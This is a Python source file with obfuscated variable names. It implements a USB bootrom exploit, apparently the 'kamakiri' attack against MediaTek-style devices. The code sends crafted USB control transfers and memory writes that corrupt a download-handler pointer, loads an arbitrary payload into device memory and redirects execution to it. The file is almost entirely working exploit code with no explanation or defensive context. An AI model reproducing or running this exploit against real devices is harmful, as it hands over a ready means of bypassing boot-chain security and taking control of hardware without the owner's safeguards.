from src .common import to_bytes ,from_bytes #line:1
from src .logger import log #line:2
import usb #line:4
import array #line:5
def exploit (O0OOO0O00OO00O0OO ,O0O0OOOOO0OO00O0O ,O0OO0000OO0O00O00 ,OO00O0000O0000OO0 ):#line:8
    def OO00O0O00000O000O (OO000OOOOOO0O00O0 ,O00OOOOOO0OOO0O0O ,check_result =True ):#line:10
        return OO00OO0OOOOO00O0O (0 ,OO000OOOOOO0O00O0 ,O00OOOOOO0OOO0O0O ,None ,check_result )#line:11
    def O0OOO00OOOO0O0O0O (O00000OOO00OOO00O ,O0O0OOO00OO000OOO ,O0OO000OO00O0O000 ,check_result =True ):#line:13
        return OO00OO0OOOOO00O0O (1 ,O00000OOO00OOO00O ,O0O0OOO00OO000OOO ,O0OO000OO00O0O000 ,check_result )#line:14
    def OO00OO0OOOOO00O0O (O00O0O0O0OO00O0OO ,OO0000OO000000O0O ,OOOOOO0OOOO0O00OO ,data =None ,check_result =True ):#line:16
            try :#line:17
                O0OOO0O00OO00O0OO .cmd_da (0 ,0 ,1 )#line:18
                O0OOO0O00OO00O0OO .read32 (OOO000O0OO000000O )#line:19
            except :#line:20
                pass #line:21
            for OO0000O0OO00O0OO0 in range (3 ):#line:23
                O0O000O000OOO0OO0 .ctrl_transfer (0x21 ,0x20 ,0 ,0 ,OO0OO0O0O0O0OOOO0 +array .array ('B',to_bytes (O0O0OOOOO0OO00O0O .ptr_da +8 -3 +OO0000O0OO00O0OO0 ,4 ,'<')))#line:24
                O0O000O000OOO0OO0 .ctrl_transfer (0x80 ,0x6 ,0x0200 ,0 ,9 )#line:25
            if OO0000OO000000O0O <0x40 :#line:27
                for OO0000O0OO00O0OO0 in range (4 ):#line:28
                    O0O000O000OOO0OO0 .ctrl_transfer (0x21 ,0x20 ,0 ,0 ,OO0OO0O0O0O0OOOO0 +array .array ('B',to_bytes (O0O0OOOOO0OO00O0O .ptr_da -6 +(4 -OO0000O0OO00O0OO0 ),4 ,'<')))#line:29
                    O0O000O000OOO0OO0 .ctrl_transfer (0x80 ,0x6 ,0x0200 ,0 ,9 )#line:30
                return O0OOO0O00OO00O0OO .cmd_da (O00O0O0O0OO00O0OO ,OO0000OO000000O0O ,OOOOOO0OOOO0O00OO ,data ,check_result )#line:31
            else :#line:32
                for OO0000O0OO00O0OO0 in range (3 ):#line:33
                    O0O000O000OOO0OO0 .ctrl_transfer (0x21 ,0x20 ,0 ,0 ,OO0OO0O0O0O0OOOO0 +array .array ('B',to_bytes (O0O0OOOOO0OO00O0O .ptr_da -5 +(3 -OO0000O0OO00O0OO0 ),4 ,'<')))#line:34
                    O0O000O000OOO0OO0 .ctrl_transfer (0x80 ,0x6 ,0x0200 ,0 ,9 )#line:35
                return O0OOO0O00OO00O0OO .cmd_da (O00O0O0O0OO00O0OO ,OO0000OO000000O0O -0x40 ,OOOOOO0OOOO0O00OO ,data ,check_result )#line:36
    OOO000O0OO000000O =O0O0OOOOO0OO00O0O .watchdog_address +0x50 #line:39
    if not O0O0OOOOO0OO00O0O .ptr_usbdl or OO00O0000O0000OO0 .kamakiri :#line:41
        log ("Using kamakiri")#line:42
        O0OOO0O00OO00O0OO .write32 (OOO000O0OO000000O ,from_bytes (to_bytes (O0O0OOOOO0OO00O0O .payload_address ,4 ),4 ,'<'))#line:43
        if O0O0OOOOO0OO00O0O .var_0 :#line:44
            O00O0O000O0OOOO00 =O0O0OOOOO0OO00O0O .var_0 +0x4 #line:45
            O0OOO0O00OO00O0OO .read32 (OOO000O0OO000000O -O0O0OOOOO0OO00O0O .var_0 ,O00O0O000O0OOOO00 //4 )#line:46
        else :#line:47
            O0OO000OOOO00OO00 =15 #line:48
            for O0000OOO0O000OOOO in range (O0OO000OOOO00OO00 ):#line:49
                O0OOO0O00OO00O0OO .read32 (OOO000O0OO000000O -(O0OO000OOOO00OO00 -O0000OOO0O000OOOO )*4 ,O0OO000OOOO00OO00 -O0000OOO0O000OOOO +1 )#line:50
        O0OOO0O00OO00O0OO .echo (0xE0 )#line:52
        O0OOO0O00OO00O0OO .echo (len (O0OO0000OO0O00O00 ),4 )#line:54
        OO00OOOOO00O0O000 =O0OOO0O00OO00O0OO .read (2 )#line:56
        if from_bytes (OO00OOOOO00O0O000 ,2 )!=0 :#line:57
            raise RuntimeError ("status is {}".format (OO00OOOOO00O0O000 .hex ()))#line:58
        O0OOO0O00OO00O0OO .write (O0OO0000OO0O00O00 )#line:60
        O0OOO0O00OO00O0OO .read (4 )#line:63
    O0O000O000OOO0OO0 =O0OOO0O00OO00O0OO .udev #line:65
    try :#line:67
        if not O0O0OOOOO0OO00O0O .ptr_usbdl or OO00O0000O0000OO0 .kamakiri :#line:68
            try :#line:69
                O0O000O000OOO0OO0 ._ctx .managed_claim_interface =lambda *O0O0O00000OO0O000 ,**O0O00O0O0O00OO0OO :None #line:71
            except AttributeError as O0000OOOO0O0O0O0O :#line:72
                raise RuntimeError ("libusb is not installed for port {}".format (O0OOO0O00OO00O0OO .dev .port ))from O0000OOOO0O0O0O0O #line:73
            O0O000O000OOO0OO0 .ctrl_transfer (0xA1 ,0 ,0 ,O0O0OOOOO0OO00O0O .var_1 ,0 )#line:74
        else :#line:75
            OO0OO0O0O0O0OOOO0 =O0O000O000OOO0OO0 .ctrl_transfer (0xA1 ,0x21 ,0 ,0 ,7 )+array .array ('B',[0 ])#line:76
            O0O00OO00O00000O0 =from_bytes (OO00O0O00000O000O (O0O0OOOOO0OO00O0O .ptr_usbdl ,4 ),4 ,'<')+8 ;#line:77
            O0OOO00OOOO0O0O0O (O0O0OOOOO0OO00O0O .payload_address ,len (O0OO0000OO0O00O00 ),O0OO0000OO0O00O00 )#line:78
            O0OOO00OOOO0O0O0O (O0O00OO00O00000O0 ,4 ,to_bytes (O0O0OOOOO0OO00O0O .payload_address ,4 ,'<'),False )#line:79
    except usb .core .USBError as O0000OOOO0O0O0O0O :#line:81
        print (O0000OOOO0O0O0O0O )#line:82
    try :#line:86
        O0OOO0O00OO00O0OO .dev .timeout =1 #line:87
    except Exception :#line:88
        pass #line:89
    try :#line:91
        O0OOOOOO0O00O00O0 =O0OOO0O00OO00O0OO .read (4 )#line:92
    except usb .core .USBError as O0000OOOO0O0O0O0O :#line:93
        print (O0000OOOO0O0O0O0O )#line:94
        return False #line:95
    return O0OOOOOO0O00O00O0 #line:97
